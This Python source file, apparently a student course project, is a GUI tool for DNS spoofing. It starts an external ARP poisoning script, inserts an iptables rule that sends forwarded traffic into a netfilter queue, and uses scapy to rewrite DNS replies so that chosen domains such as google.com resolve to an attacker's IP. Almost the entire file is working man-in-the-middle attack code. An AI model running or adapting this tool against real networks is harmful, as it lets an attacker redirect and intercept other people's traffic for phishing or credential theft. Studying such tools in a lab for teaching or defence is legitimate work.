#!/usr/bin/python3
"""

@name           dns_spoofer.py

@topic          Data Communication Applications - DNS spoofing

@author         Kuanysh Boranbayev

@date           November 12, 2020

@modules        This program is only responsible for DNS spoofing              
                part. Before running this program, I suggest you run
                your ARP poisoining program first.

@version        1.0
"""
from tkinter import filedialog, Toplevel, Text, Tk, Label, Button, Listbox, StringVar, END, W, E, HORIZONTAL
from PIL import ImageTk, Image
from threading import *
from scapy.all import *
import sys, os, subprocess, multiprocessing
import signal
import time
from scapy.all import *
from netfilterqueue import NetfilterQueue


APP_TITLE = "DNS Spoofing"
APP_MSG = "Kuanysh Boranbayev"

USAGE_TITLE = "User Manual"
USAGE = "Type target domain in 'Target Domain' field.\nType corresponding destination IP address in 'Redirect IP Address'.\nClick 'Add' button to insert the hosts.\n'Start ARP poisoning' by clicking the corresponding button.\nClick 'Enable DNS spoofing'.\n"

BTN_HELP = "Help"
BTN_ADD = "Add"
BTN_ARP_SPOOF_START = "Start ARP poisoning"
BTN_ARP_SPOOF_STOP = "Stop ARP poisoning"
BTN_DNS_SPOOF_START = "Enable DNS spoofing"
BTN_DNS_SPOOF_STOP = "Disable DNS spoofing"


PLACEHOLDER_SDNS = "Target Domain"
PLACEHOLDER_DDNS = "Redirect IP Address"

ERR = "Error"

DEFAULT_COLOR = "#181b28"

DNS_list = {
        b"www.google.com." : "10.0.0.173", 
        b"google.com.": "10.0.0.173"
    }

def process_packet(pkt):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    
    # Convert netfilter queue packet to scapy packet
    scapy_pkt = IP(pkt.get_payload())
    
    if scapy_pkt.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        
        #print("[Before]: ", scapy_pkt.summary())
        try:
            scapy_pkt = modify(scapy_pkt)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        #print("[After]:", scapy_pkt.summary())
        # set back as netfilter queue packet
        pkt.set_payload(bytes(scapy_pkt))
        
    # accept the packet
    pkt.accept()

def modify(pkt):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenever we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (10.0.0.173)
    """
    # get the DNS question name, the domain name
    qname = pkt[DNSQR].qname
    if qname not in DNS_list:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
    else:
        print("Spoofing: ", qname, " ", DNS_list[qname])
        # craft new answer, overriding the original
        # setting the rdata for the IP we want to redirect (spoofed)
        # for instance, google.com will be mapped to "10.0.0.173"
        pkt[DNS].an = DNSRR(rrname = qname, rdata = DNS_list[qname])
        # set the answer count to 1
        pkt[DNS].ancount = 1
        # delete checksums and length of packet, because we have modified
        # new calculation are required (scapy will do automatically)
        del pkt[IP].len
        del pkt[IP].chksum
        del pkt[UDP].len
        del pkt[UDP].chksum
        # return the modified packet
    return pkt

QUEUE_NUM = None


class DNS_Spoof:
    def __init__ (self, master):
        self.master = master
        master.title(APP_TITLE)
        
        self.srcDNS = None
        self.dstDNS = None
        
        self.queue = None
        self.arp_p = None
        
        self.process = None

        self.entry_srcDNS = Text(master, height = 1, width = 36)
        self.entry_dstDNS = Text(master, height = 1, width = 36)
        self.entry_DNS_list = Text(master, height = 1, width = 36)
        
        self.entry_srcDNS.insert(END, PLACEHOLDER_SDNS)
        self.entry_dstDNS.insert(END, PLACEHOLDER_DDNS)
        
        self.help_btn = Button(master, text=BTN_HELP, command = self.show_usage)
        self.arp_start_btn = Button(master, text=BTN_ARP_SPOOF_START, command = self.start_arpspoof)
        self.arp_stop_btn = Button(master, text=BTN_ARP_SPOOF_STOP, command = self.stop_arpspoof)
        self.dns_start_btn = Button(master, text=BTN_DNS_SPOOF_START, command = self.dnsspoof_start)
        self.dns_stop_btn = Button(master, text=BTN_DNS_SPOOF_STOP, command = self.dnsspoof_stop)
        self.add_btn = Button(master, text=BTN_ADD, command = self.add_item)
        
        x = []
        self.lb1 = Listbox(master)
        self.lb2 = Listbox(master)
        
        n = 0
        for k in DNS_list.keys():
            self.lb1.insert( n, k.decode("utf-8"))
            self.lb2.insert( n, DNS_list[k])
            n = n + 1
            
        self.lb1.grid(row=0, column=1, columnspan = 1)
        self.lb2.grid(row=0, column=2)
        
        #self.message = x
        #self.label_text = StringVar()
        #self.label_text.set(self.message)
        #self.label = Label(master, textvariable=self.label_text)
        
        #self.label.grid(row=0, column=0, columnspan=2, padx = 10, pady = 10)
        
        self.entry_srcDNS.grid(row = 1, column = 1, padx = 10)
        self.entry_dstDNS.grid(row = 1, column = 2, padx = 10)
        
        self.arp_start_btn.grid(row=2, column=1, padx=10, pady=10)
        self.arp_stop_btn.grid(row=2, column=2, padx=10, pady=10)
        
        self.dns_start_btn.grid(row=3, column=1, padx=10, pady=10)
        self.dns_stop_btn.grid(row=3, column=2, padx=10, pady=10)
        
        self.help_btn.grid(row=4, column=1, padx=10, pady=10)
        self.help_btn.config(bg="white", fg="black")
        self.add_btn.grid(row=4, column=2, padx=10, pady=10)
        self.add_btn.config(bg="green")
        
    def add_item(self):
        self.srcDNS = self.entry_srcDNS.get(1.0, END+"-1c")
        self.dstDNS = self.entry_dstDNS.get(1.0, END+"-1c")
        if self.srcDNS == None:
            self.popupmsg(ERR, "Target IP or domain is missing.")
        elif self.dstDNS == None:
            self.popupmsg(ERR, "Destination IP or domain is missing.")
        
        DNS_list.setdefault(bytes(self.srcDNS, "utf-8"), self.dstDNS)
        self.master.update()
        self.__init__(self.master)

    
    def stop_arpspoof(self):
        print("Stoppping ARP spoof")
        self.arp_stop_btn.config(bg="red")
        self.arp_start_btn.config(bg=DEFAULT_COLOR)
        self.arp_p.kill()

    def start_arpspoof(self):
        print("Starting ARP spoof")
        self.arp_stop_btn.config(bg=DEFAULT_COLOR)
        self.arp_start_btn.config(bg="blue")
        self.arp_p = subprocess.Popen("python arpspoof.py", stdout=subprocess.PIPE, shell=True)
    
    def dnsspoof_stop(self):
        print("Disabled DNS spoof")
        self.dns_stop_btn.config(bg="red")
        self.dns_start_btn.config(bg=DEFAULT_COLOR)
        os.system("iptables --flush")
        self.process.terminate()
    
    def worker(self):
        QUEUE_NUM = 0
        # insert the iptables FORWARD rule
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
        self.queue = NetfilterQueue()
        
        try:
            # bind the queue number to our callback `process_packet`
            # and start it
            self.queue.bind(QUEUE_NUM, process_packet)
            self.queue.run()
        except KeyboardInterrupt:
            # if want to exit, make sure we
            # remove that rule we just inserted, going back to normal.
            os.system("iptables --flush")
        
    def dnsspoof_start(self):
        print("Enabled DNS spoof")
        
        self.dns_start_btn.config(bg="blue")
        self.dns_stop_btn.config(bg=DEFAULT_COLOR)
        
        self.process = multiprocessing.Process(target=self.worker)
        self.process.start()

    def show_usage(self):
        popup = Tk()
        popup.wm_title(USAGE_TITLE)
        label = Label(popup, text=USAGE)
        label.pack(side="top", fill="x", padx=70)
        B1 = Button(popup, text="OK", command = popup.destroy)
        B1.pack()
        popup.mainloop()

    # Pop-up message display
    # @param title - title for the message widget
    # @param msg - message text
    def popupmsg(self, title, msg):
        popup = Tk()
        popup.wm_title(title)
        label = Label(popup, text=msg)
        label.pack(side="top", fill="x", padx=70)
        B1 = Button(popup, text="OK", command = popup.destroy)
        B1.pack()
        popup.mainloop()

root = Tk()
gui = DNS_Spoof(root)
root.mainloop()
